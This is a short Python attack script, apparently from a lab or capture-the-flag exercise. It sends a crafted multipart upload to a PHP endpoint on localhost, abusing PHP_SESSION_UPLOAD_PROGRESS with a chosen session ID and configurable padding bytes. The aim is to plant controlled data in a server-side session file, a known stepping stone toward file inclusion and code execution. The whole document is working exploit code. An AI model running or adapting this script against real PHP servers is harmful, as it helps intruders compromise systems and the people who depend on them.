#!/usr/bin/env python3
import socket,sys,os,argparse,time
def body(sid,pad,key,path_type="consumer"):
    b="----bgBoundary7MA4YWxkTrZu0gW"; parts=[]
    def field(n,v):
        parts.append(f"--{b}\r\nContent-Disposition: form-data; name=\"{n}\"\r\n\r\n".encode())
        parts.append(v if isinstance(v,bytes) else v.encode()); parts.append(b"\r\n")
    field("PHPSESSID",sid)
    if pad: field("pad",pad)
    field("PHP_SESSION_UPLOAD_PROGRESS",key)
    parts.append(f"--{b}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\nContent-Type: text/plain\r\n\r\n".encode())
    parts.append(b"A"); parts.append(f"\r\n--{b}--\r\n".encode())
    return b"".join(parts),b
ap=argparse.ArgumentParser()
ap.add_argument("--port",type=int,default=29352)
ap.add_argument("--sid",default="padsid1")
ap.add_argument("--pad-hex",default=None)
ap.add_argument("--pad-len",type=int,default=0)
ap.add_argument("--pad-byte",default="50")
ap.add_argument("--pad-file",default=None)
ap.add_argument("--key",default="bgupload")
ap.add_argument("--out",default=None)
a=ap.parse_args()
if a.pad_file: pad=open(a.pad_file,"rb").read()
elif a.pad_hex is not None: pad=bytes.fromhex(a.pad_hex)
elif a.pad_len: pad=bytes([int(a.pad_byte,16)])*a.pad_len
else: pad=b""
b,c=body(a.sid,pad,a.key)
hdr=(f"POST /consumer.php HTTP/1.1\r\nHost: 127.0.0.1:{a.port}\r\nContent-Type: multipart/form-data; boundary={c}\r\nContent-Length: {len(b)}\r\nConnection: close\r\n\r\n").encode()
raw=hdr+b
if a.out:
    os.makedirs(os.path.dirname(a.out),exist_ok=True); open(a.out,"wb").write(raw)
s=socket.create_connection(("127.0.0.1",a.port),timeout=20); t0=time.time(); s.sendall(raw)
data=b""
try:
    while True:
        x=s.recv(65536)
        if not x: break
        data+=x
except socket.timeout: pass
s.close()
print("dt=%.3f bytes=%d"%(time.time()-t0,len(data)))
print(data.decode("latin1","replace")[:400])
